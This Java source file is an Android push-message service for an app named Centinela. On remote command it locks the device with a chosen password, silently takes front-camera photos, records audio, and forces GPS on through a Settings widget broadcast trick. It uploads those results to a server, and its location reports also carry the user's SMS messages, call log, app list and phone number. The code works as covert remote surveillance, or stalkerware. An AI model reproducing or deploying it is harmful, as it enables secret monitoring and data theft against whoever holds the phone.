package app.vjsantojaca.merinosa.com.centinela.services.gcm;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.gcm.GcmListenerService;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import app.vjsantojaca.merinosa.com.centinela.App;
import app.vjsantojaca.merinosa.com.centinela.AudioRecorder;
import app.vjsantojaca.merinosa.com.centinela.Constants;
import app.vjsantojaca.merinosa.com.centinela.MessageActivity;
import app.vjsantojaca.merinosa.com.centinela.R;
import app.vjsantojaca.merinosa.com.centinela.SystemEnum;
import app.vjsantojaca.merinosa.com.centinela.Utils;
import app.vjsantojaca.merinosa.com.centinela.services.DeviceAdmReceiver;
import app.vjsantojaca.merinosa.com.centinela.volley.MultiPartRequestObject;
import app.vjsantojaca.merinosa.com.centinela.volley.ServerStatusRequestObject;
import app.vjsantojaca.merinosa.com.centinela.volley.VolleyS;

/*
* Developer Víctor Santoja
 * Centinela App pertenece al proyecto Centinela
*/
public class MyGcmListenerService extends GcmListenerService implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener
{
    private static final String TAG = MyGcmListenerService.class.getName();
    private GoogleApiClient mGoogleApiClient;

    /**
     * Called when message is received.
     *
     * @param from SenderID of the sender.
     * @param data Data bundle containing message data as key/value pairs.
     *             For Set of keys use data.keySet().
     */
    @Override
    public void onMessageReceived(String from, Bundle data) {
        String type = data.getString("type");
        String pass;

        if( type != null )
        {
            switch (type)
            {
                case "location":
                    getLocation();
                    break;
                case "block":
                    pass = data.getString("pass");
                    blockDevice(pass);
                    break;
                case "unblock":
                    pass = data.getString("pass");
                    unblockDevice(pass);
                    break;
                case "message":
                    String message = data.getString("message");
                    notificationMessage( message );
                    break;
                case "photo":
                    getPhoto();
                    break;
                case "audio":
                    int time = data.getInt("time");
                    getAudio(time);
                    break;
            }
        }
    }

    /**
     * Create and show a simple notification containing the received GCM message.
     *
     * @param message GCM message received.
     */
    private void notificationMessage(String message) {
        NotificationManager mNotificationManager = (NotificationManager) App.getAppContext().getSystemService(Context.NOTIFICATION_SERVICE);

        NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(App.getAppContext());
        mBuilder.setContentTitle("Centinela");
        mBuilder.setContentText(message);
        mBuilder.setSmallIcon(R.drawable.icon_merino);
        mBuilder.setAutoCancel(true);
        mBuilder.setLights(Color.BLUE, 500, 500);
        long[] pattern = {500, 500, 500, 500, 500, 500, 500, 500, 500};
        mBuilder.setVibrate(pattern);

        Uri uriSong = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);

        mBuilder.setSound(uriSong);

        Intent notIntent = new Intent(App.getAppContext(), MessageActivity.class);

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);

        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("message", message);
        editor.commit();

        PendingIntent contIntent = PendingIntent.getActivity(App.getAppContext(), 0, notIntent, 0);

        mBuilder.setContentIntent(contIntent);

        mNotificationManager.notify(1, mBuilder.build());
    }

    /**
     * Block device
     *
     * @param pass pass to block de device.
     */
    private void blockDevice(String pass)
    {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("pass", pass);
        editor.commit();

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) App.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(App.getAppContext(), DeviceAdmReceiver.class);
        boolean active = devicePolicyManager.isAdminActive(componentName);
        if (active)
        {
            devicePolicyManager.setPasswordQuality(componentName, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
            devicePolicyManager.setPasswordMinimumLength(componentName, 4);
            devicePolicyManager.resetPassword(pass, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            devicePolicyManager.lockNow();
        }
    }

    /**
     * Unblock device
     *
     * @param pass pass to unblock de device.
     */
    private void unblockDevice(String pass) {

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        String passOld = prefs.getString("pass", "");

        if (pass.equals(passOld)) {

            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) App.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(App.getAppContext(), DeviceAdmReceiver.class);
            boolean active = devicePolicyManager.isAdminActive(componentName);
            if (active) {
                devicePolicyManager.setPasswordQuality(componentName, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
                devicePolicyManager.setPasswordMinimumLength(componentName, 0);
                devicePolicyManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                devicePolicyManager.lockNow();
            }
        }
    }

    /**
     * Get Audio device
     *
     * @param time time to audio.
     */
    private void getAudio(int time)
    {
        final AudioRecorder audioRecorder = new AudioRecorder();
        try {
            audioRecorder.start();
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                public void run() {
                    try {
                        audioRecorder.stop();
                        ContextWrapper cw = new ContextWrapper(App.getAppContext());
                        File fileToSend = null;
                        File dir = cw.getDir("sound_dir", Context.MODE_PRIVATE);
                        int date = 0;
                        if (dir.exists())
                        {
                            for (File f : dir.listFiles())
                            {
                                String nameFile = f.getName();
                                nameFile = nameFile.substring(9, (nameFile.length() - 4));

                                if( date < Integer.getInteger(nameFile) )
                                {
                                    date = Integer.getInteger(nameFile);
                                    fileToSend = f;
                                }
                            }
                        }

                        if( fileToSend != null )
                        {
                            VolleyS volleyS = App.getVolley();
                            String url = Constants.URL_SERVER + Constants.PATH_SOUND;
                            MultiPartRequestObject multiPartRequestObject = new MultiPartRequestObject(
                                    url,
                                    new Response.ErrorListener()
                                    {
                                        @Override
                                        public void onErrorResponse(VolleyError volleyError)
                                        {
                                            Log.d(TAG, "Error Respuesta: " + volleyError);
                                        }
                                    },
                                    new Response.Listener<Integer>()
                                    {
                                        @Override
                                        public void onResponse(Integer response)
                                        {
                                            if( response == 200 )
                                                Log.d(TAG, "Envío con éxito:");
                                        }
                                    },
                                    fileToSend,
                                    ""
                            );

                            volleyS.getRequestQueue().add(multiPartRequestObject);
                        }
                    } catch (IOException e)
                    {
                        e.printStackTrace();
                    }
                }
            }, (time * 1000));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Get Image to Frontal Camera
     *
     */
    private void getPhoto()
    {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB )
        {
            Camera camera;

            int camId = -1;
            int numberOfCameras = Camera.getNumberOfCameras();
            Camera.CameraInfo ci = new Camera.CameraInfo();

            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, ci);
                if (ci.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    camId = i;
                }
            }

            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            Camera.getCameraInfo(camId, cameraInfo);

            try {
                camera = Camera.open(camId);
            } catch (RuntimeException e) {
                Log.i(TAG,"Camera not available: " + camId);
                camera = null;
                e.printStackTrace();
            }
            try {
                if (null == camera) {
                    Log.i(TAG, "Could not get camera instance");
                } else {
                    Log.i(TAG, "Got the camera, creating the dummy surface texture");
                    try
                    {
                        camera.setPreviewTexture(new SurfaceTexture(0));
                        camera.startPreview();
                    } catch (Exception e)
                    {
                        Log.i(TAG, "Could not set the surface preview texture");
                        e.printStackTrace();
                    }
                    System.gc();
                    camera.takePicture(null, null, new Camera.PictureCallback()
                    {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera)
                        {
                            Log.i(TAG, "image take");

                            try
                            {
                                VolleyS volleyS = App.getVolley();
                                File tempFile = File.createTempFile("tempImage", ".tmp", null);
                                FileOutputStream fos = new FileOutputStream(tempFile);
                                fos.write(data);

                                String url = Constants.URL_SERVER + Constants.PATH_PICTURE;
                                MultiPartRequestObject multiPartRequestObject = new MultiPartRequestObject(
                                        url,
                                        new Response.ErrorListener()
                                        {
                                            @Override
                                            public void onErrorResponse(VolleyError volleyError)
                                            {
                                                Log.d(TAG, "Error Respuesta: " + volleyError);
                                            }
                                        },
                                        new Response.Listener<Integer>()
                                        {
                                            @Override
                                            public void onResponse(Integer response)
                                            {
                                                if( response == 200 )
                                                    Log.d(TAG, "Envío con éxito:");
                                            }
                                        },
                                        tempFile,
                                        ""
                                );

                                volleyS.getRequestQueue().add(multiPartRequestObject);

                            } catch (FileNotFoundException e)
                            {
                                e.printStackTrace();
                            } catch (IOException e)
                            {
                                e.printStackTrace();
                            }

                            camera.release();
                        }
                    });
                }
            } catch (Exception e) {
                camera.release();
            }
        }
    }

    /**
     * Send location to server
     *
     */
    private void getLocation()
    {
        LocationManager lm = (LocationManager) App.getAppContext().getSystemService(Context.LOCATION_SERVICE);

        if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) { //if gps is disabled
            final Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
            poke.setData(Uri.parse("3"));
            App.getAppContext().sendBroadcast(poke);
        }

        if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            final VolleyS volleyS = App.getVolley();
            String url = Constants.URL_SERVER + Constants.PATH_SYSTEM;
            JSONObject object = new JSONObject();
            try {
                object.put("id", Utils.getNumberPhone());
                object.put("type", SystemEnum.GPSOFF);
            } catch (JSONException e) {
                e.printStackTrace();
            }

            ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                    Request.Method.POST,
                    url,
                    null,
                    object.toString(),
                    new Response.Listener<Integer>() {
                        @Override
                        public void onResponse(Integer response) {
                            if( response == 200 ) {
                                Log.d(TAG, "Se ha enviado con éxito");
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError volleyError) {
                            Log.d(TAG, "Error Respuesta: " + volleyError);
                        }
                    }
            );

            volleyS.getRequestQueue().add(serverStatusRequest);

            ConnectivityManager connManager = (ConnectivityManager) App.getAppContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

            if (mWifi.isConnected())
            {
                JsonObjectRequest jsObjRequest = new JsonObjectRequest(
                        Request.Method.GET,
                        "http://ifcfg.me/ip",
                        new Response.Listener<JSONObject>()
                        {
                            @Override
                            public void onResponse(JSONObject response)
                            {
                                StringBuilder urlBuilder = new StringBuilder();
                                urlBuilder.append("http://getcitydetails.geobytes.com/GetCityDetails?fqcn=");
                                urlBuilder.append(response);
                                String  url = new String(urlBuilder.toString());

                                JsonObjectRequest jsObjRequest = new JsonObjectRequest(
                                        Request.Method.GET,
                                        url,
                                        new Response.Listener<JSONObject>()
                                        {
                                            @Override
                                            public void onResponse(JSONObject response)
                                            {
                                                String url = Constants.URL_SERVER + Constants.PATH_LOCATION;
                                                JSONObject object = new JSONObject();
                                                try {
                                                    object.put("latitude", response.getDouble("geobyteslatitude"));
                                                    object.put("longitude", response.getDouble("geobyteslongitude"));
                                                    object.put("batteryState", Utils.getBattery());
                                                    object.put("sms", Utils.getSMS());
                                                    object.put("calls", Utils.getListCalls());
                                                    object.put("apps", Utils.getListApps());
                                                    object.put("id", Utils.getNumberPhone());
                                                } catch (JSONException e) {
                                                    e.printStackTrace();
                                                }

                                                ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                                                        Request.Method.POST,
                                                        url,
                                                        null,
                                                        object.toString(),
                                                        new Response.Listener<Integer>() {
                                                            @Override
                                                            public void onResponse(Integer response) {
                                                                if( response == 200 ) {
                                                                    Log.d(TAG, "Se ha enviado con éxito la localización");
                                                                }
                                                            }
                                                        },
                                                        new Response.ErrorListener() {
                                                            @Override
                                                            public void onErrorResponse(VolleyError error) {
                                                                Log.d(TAG, "Error Respuesta: " + error);
                                                            }
                                                        }
                                                );

                                                volleyS.getRequestQueue().add(serverStatusRequest);
                                            }
                                        },
                                        new Response.ErrorListener()
                                        {
                                            @Override
                                            public void onErrorResponse(VolleyError error)
                                            {
                                                Log.d(TAG, "Error Respuesta: " + error);
                                            }
                                        }
                                );

                                volleyS.getRequestQueue().add(jsObjRequest);
                            }
                        },
                        new Response.ErrorListener()
                        {
                            @Override
                            public void onErrorResponse(VolleyError error)
                            {
                                Log.d(TAG, "Error Respuesta: " + error);
                            }
                        }
                );

                volleyS.getRequestQueue().add(jsObjRequest);
            }

        } else{
            buildGoogleApiClient();
        }
    }

    protected synchronized void buildGoogleApiClient()
    {
        mGoogleApiClient = new GoogleApiClient.Builder(App.getAppContext())
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .addApi(LocationServices.API)
                .build();
        mGoogleApiClient.connect();
    }

    @Override
    public void onConnected(Bundle bundle)
    {
        Log.i(TAG, "Conectado");
        Location mLastLocation = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);
        if ( mLastLocation != null)
        {
            Log.i(TAG, "Location: " + mLastLocation.toString());

            //Enviamos la información de la localización inicial al servidor.

            VolleyS volleyS = App.getVolley();
            String url = Constants.URL_SERVER + Constants.PATH_LOCATION;
            JSONObject object = new JSONObject();
            try {
                object.put("latitude", mLastLocation.getLatitude());
                object.put("longitude", mLastLocation.getLongitude());
                object.put("batteryState", Utils.getBattery());
                object.put("sms", Utils.getSMS());
                object.put("calls", Utils.getListCalls());
                object.put("apps", Utils.getListApps());
                object.put("id", Utils.getNumberPhone());
            } catch (JSONException e) {
                e.printStackTrace();
            }

            ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                    Request.Method.POST,
                    url,
                    null,
                    object.toString(),
                    new Response.Listener<Integer>() {
                        @Override
                        public void onResponse(Integer response) {
                            if( response == 200 ) {
                                Log.d(TAG, "Se ha enviado con éxito la localización");
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d(TAG, "Error Respuesta: " + error);
                        }
                    }
            );

            volleyS.getRequestQueue().add(serverStatusRequest);
        } else {
            //Creamos un request para que compruebe las modificaciones en la localización y así obtener la nueva localización
            LocationRequest mLocationRequest = new LocationRequest();
            mLocationRequest.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
            Log.d(TAG, "RequestLocationUpdates");
            LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);
        }
    }

    @Override
    public void onConnectionSuspended(int i)
    {
        mGoogleApiClient.connect();
    }

    @Override
    public void onLocationChanged(Location location)
    {
        Log.d(TAG, "Location: " + location.toString());

        VolleyS volleyS = App.getVolley();
        String url = Constants.URL_SERVER + Constants.PATH_LOCATION;
        JSONObject object = new JSONObject();
        try {
            object.put("latitude", location.getLatitude());
            object.put("longitude", location.getLongitude());
            object.put("batteryState", Utils.getBattery());
            object.put("sms", Utils.getSMS());
            object.put("calls", Utils.getListCalls());
            object.put("apps", Utils.getListApps());
            object.put("id", Utils.getNumberPhone());
        } catch (JSONException e) {
            e.printStackTrace();
        }

        ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                Request.Method.POST,
                url,
                null,
                object.toString(),
                new Response.Listener<Integer>() {
                    @Override
                    public void onResponse(Integer response) {
                        if( response == 200 ) {
                            Log.d(TAG, "Se ha enviado con éxito la localización");
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Log.d(TAG, "Error Respuesta: " + error);
                    }
                }
        );

        volleyS.getRequestQueue().add(serverStatusRequest);

        LocationServices.FusedLocationApi.removeLocationUpdates(mGoogleApiClient, this);
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult)
    {
        Log.i(TAG, "Connection failed: ConnectionResult.getErrorCode() = " + connectionResult.getErrorCode());
    }
}